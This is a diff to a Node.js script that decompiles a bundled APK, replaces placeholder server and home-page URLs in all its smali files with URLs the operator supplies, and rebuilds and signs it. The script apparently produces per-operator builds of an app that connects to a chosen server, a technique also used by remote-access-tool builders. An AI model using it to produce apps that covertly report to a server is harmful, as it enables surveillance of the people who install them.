@@ -3,10 +3,8 @@ const fs = require('fs');
 const path = require('path');
 const config = require('./config');
 
-// Progress file path
+// core paths
 const progressFile = path.join(config.dbPath, 'build_progress.json');
-
-// Paths for APK building
 const apkToolPath = path.join(__dirname, '../app/factory/apktool.jar');
 const signerPath = path.join(__dirname, '../app/factory/uber-apk-signer.jar');
 const rawApkPath = path.join(__dirname, '../app/factory/rawapk/app-debug.apk');
@@ -15,45 +13,47 @@ const builtApkPath = path.join(config.dbPath, 'built_apks');
 const outputApk = path.join(builtApkPath, 'build.apk');
 const signedApk = path.join(builtApkPath, 'build.s.apk');
 
-// Smali class path
-const smaliClassPath = path.join('com', 'fason', 'app', 'core', 'config', 'Config.smali');
+// default placeholders
+const DEFAULT_SERVER_URL = 'http://127.0.0.1:22533';
+const DEFAULT_HOME_PAGE = 'https://google.com';
 
-// Ensure directories exist
-if (!fs.existsSync(builtApkPath)) fs.mkdirSync(builtApkPath, { recursive: true });
+// ensure output dir
+if (!fs.existsSync(builtApkPath)) {
+    fs.mkdirSync(builtApkPath, { recursive: true });
+}
 
+// progress writer
 function progress(step, message, complete = false) {
     try {
-        fs.writeFileSync(progressFile, JSON.stringify({ step, message, complete, time: new Date().toISOString() }));
-    } catch (e) {}
+        fs.writeFileSync(progressFile, JSON.stringify({
+            step,
+            message,
+            complete,
+            time: new Date().toISOString()
+        }));
+    } catch {}
     console.log(`[BUILD] ${step}: ${message}`);
 }
 
+// get progress
 function getProgress() {
     try {
         if (fs.existsSync(progressFile)) {
             return JSON.parse(fs.readFileSync(progressFile, 'utf8'));
         }
-    } catch (e) {}
+    } catch {}
     return { step: 'idle', message: 'Ready', complete: false };
 }
 
-function findSmaliPath() {
-    const bases = ['smali', 'smali_classes2', 'smali_classes3', 'smali_classes4', 'smali_classes5'];
-    for (const base of bases) {
-        const p = path.join(decompilePath, base, smaliClassPath);
-        if (fs.existsSync(p)) return p;
-    }
-    return null;
-}
-
+// check java
 function checkJava(cb) {
-    progress('java', 'Checking Java version...');
-    const spawn = cp.spawn('java', ['-version']);
+    progress('java', 'Checking Java...');
+    const proc = cp.spawn('java', ['-version']);
     let output = '';
-    
-    spawn.stderr.on('data', d => output += d.toString());
-    spawn.on('error', () => cb('Java not found. Please install Java 8+'));
-    spawn.on('close', () => {
+
+    proc.stderr.on('data', d => output += d.toString());
+    proc.on('error', () => cb('Java not found. Install Java 8+'));
+    proc.on('close', () => {
         if (output.includes('version')) {
             progress('java', 'Java detected', true);
             cb(null);
@@ -63,7 +63,8 @@ function checkJava(cb) {
     });
 }
 
-function cleanDecompiled() {
+// clean workspace
+function cleanWorkspace() {
     try {
         if (fs.existsSync(decompilePath)) {
             fs.rmSync(decompilePath, { recursive: true, force: true });
@@ -75,18 +76,19 @@ function cleanDecompiled() {
     }
 }
 
+// decompile apk
 function decompile(cb) {
-    progress('decompile', 'Cleaning workspace...');
-    const err = cleanDecompiled();
-    if (err) return cb('Clean failed: ' + err);
-    
+    progress('decompile', 'Preparing workspace...');
+    const err = cleanWorkspace();
+    if (err) return cb(err);
+
     if (!fs.existsSync(rawApkPath)) {
-        return cb('Raw APK not found. Place app-debug.apk in app/factory/rawapk/');
+        return cb('Raw APK not found');
     }
-    
+
     progress('decompile', 'Decompiling APK...');
     const cmd = `java -jar "${apkToolPath}" d "${rawApkPath}" -o "${decompilePath}" -f`;
-    
+
     cp.exec(cmd, (error) => {
         if (error) return cb('Decompile failed: ' + error.message);
         progress('decompile', 'Decompiled successfully', true);
@@ -94,93 +96,162 @@ function decompile(cb) {
     });
 }
 
-function patch(host, port, cb) {
-    progress('patch', 'Locating Config.smali...');
-    const smaliFile = findSmaliPath();
-    if (!smaliFile) return cb('Config.smali not found');
-    
-    progress('patch', 'Patching SERVER_HOST...');
-    fs.readFile(smaliFile, 'utf8', (err, data) => {
-        if (err) return cb('Cannot read smali file');
-        
-        const newUrl = `http://${host}:${port}`;
-        const regex = /(\.field\s+[^\n]*\bSERVER_HOST:Ljava\/lang\/String;[^\n]*=\s*")(https?:\/\/[^"\r\n]+)(")/;
-        const match = data.match(regex);
-        
-        if (!match) return cb('SERVER_HOST not found in smali');
-        
-        const currentUrl = match[2];
-        if (currentUrl === newUrl) {
-            progress('patch', 'Already patched', true);
-            return cb(null);
-        }
-        
-        const updated = data.replace(new RegExp(currentUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), newUrl);
-        
-        fs.writeFile(smaliFile, updated, 'utf8', (err) => {
-            if (err) return cb('Cannot write smali file');
-            progress('patch', 'Patched successfully', true);
-            cb(null);
-        });
-    });
+// get smali dirs
+function getSmaliDirs() {
+    if (!fs.existsSync(decompilePath)) return [];
+    return fs.readdirSync(decompilePath)
+        .filter(d => d.startsWith('smali'))
+        .map(d => path.join(decompilePath, d));
 }
 
+// recursive smali scan
+function scanSmali(dir) {
+    let results = [];
+    fs.readdirSync(dir).forEach(file => {
+        const filePath = path.join(dir, file);
+        const stat = fs.statSync(filePath);
+        if (stat.isDirectory()) {
+            results = results.concat(scanSmali(filePath));
+        } else if (file.endsWith('.smali')) {
+            results.push(filePath);
+        }
+    });
+    return results;
+}
+
+// escape regex
+function escapeRegex(str) {
+    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
+
+// normalize url
+function normalizeUrl(url, fallbackProtocol) {
+    if (!url) return null;
+    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+        return fallbackProtocol + url;
+    }
+    return url;
+}
+
+// patch logic
+function patch(serverUrl, homePageUrl, cb) {
+    progress('patch', 'Scanning smali files...');
+
+    const newServer = normalizeUrl(serverUrl, 'http://');
+    const newHome = normalizeUrl(homePageUrl || DEFAULT_HOME_PAGE, 'https://');
+
+    const smaliDirs = getSmaliDirs();
+    if (!smaliDirs.length) return cb('No smali directories found');
+
+    let serverCount = 0;
+    let homeCount = 0;
+
+    try {
+        smaliDirs.forEach(dir => {
+            const files = scanSmali(dir);
+
+            files.forEach(file => {
+                let data = fs.readFileSync(file, 'utf8');
+                let modified = false;
+
+                const replacements = [
+                    { from: DEFAULT_SERVER_URL, to: newServer, counter: () => serverCount++ },
+                    { from: DEFAULT_HOME_PAGE, to: newHome, counter: () => homeCount++ }
+                ];
+
+                replacements.forEach(r => {
+                    const regex = new RegExp(escapeRegex(r.from), 'g');
+                    if (regex.test(data)) {
+                        data = data.replace(regex, r.to);
+                        modified = true;
+                        r.counter();
+                    }
+                });
+
+                if (modified) {
+                    fs.writeFileSync(file, data, 'utf8');
+                }
+            });
+        });
+
+        if (serverCount === 0) {
+            return cb('Server URL not found to patch');
+        }
+
+        progress('patch', `Patched server: ${serverCount}, home: ${homeCount}`, true);
+        cb(null);
+
+    } catch (e) {
+        cb('Patch failed: ' + e.message);
+    }
+}
+
+// build apk
 function build(cb) {
     progress('build', 'Building APK...');
     const cmd = `java -jar "${apkToolPath}" b "${decompilePath}" -o "${outputApk}"`;
-    
+
     cp.exec(cmd, (error) => {
         if (error) return cb('Build failed: ' + error.message);
-        progress('build', 'APK built successfully', true);
+        progress('build', 'Build successful', true);
         cb(null);
     });
 }
 
+// sign apk
 function sign(cb) {
     progress('sign', 'Signing APK...');
     const cmd = `java -jar "${signerPath}" --apks "${outputApk}" --overwrite`;
-    
+
     cp.exec(cmd, (error) => {
         if (error) return cb('Signing failed: ' + error.message);
-        
-        // Copy to download location
+
         try {
             fs.copyFileSync(outputApk, signedApk);
         } catch (e) {
             return cb('Copy failed: ' + e.message);
         }
-        
+
         progress('sign', 'Signed successfully', true);
         cb(null);
     });
 }
 
+// cleanup
 function cleanup() {
-    progress('cleanup', 'Cleaning up...');
-    cleanDecompiled();
+    progress('cleanup', 'Cleaning files...');
+    cleanWorkspace();
     progress('cleanup', 'Done', true);
 }
 
-// Main build function
-function buildApk(host, port, cb) {
-    if (!host || !port) return cb('Host and port required');
-    if (port < 1024 || port > 65535) return cb('Invalid port');
-    
+// main build flow
+function buildApk(serverUrl, homePageUrl, cb) {
+    if (!serverUrl) return cb('Server URL required');
+
+    const normalized = normalizeUrl(serverUrl, 'http://');
+
+    try {
+        const urlObj = new URL(normalized);
+        if (!urlObj.hostname) return cb('Invalid server URL');
+    } catch {
+        return cb('Invalid server URL format');
+    }
+
     checkJava(err => {
         if (err) return cb(err);
-        
+
         decompile(err => {
             if (err) return cb(err);
-            
-            patch(host, port, err => {
+
+            patch(serverUrl, homePageUrl, err => {
                 if (err) return cb(err);
-                
+
                 build(err => {
                     if (err) return cb(err);
-                    
+
                     sign(err => {
                         if (err) return cb(err);
-                        
+
                         cleanup();
                         progress('done', 'Build completed!', true);
                         cb(null);
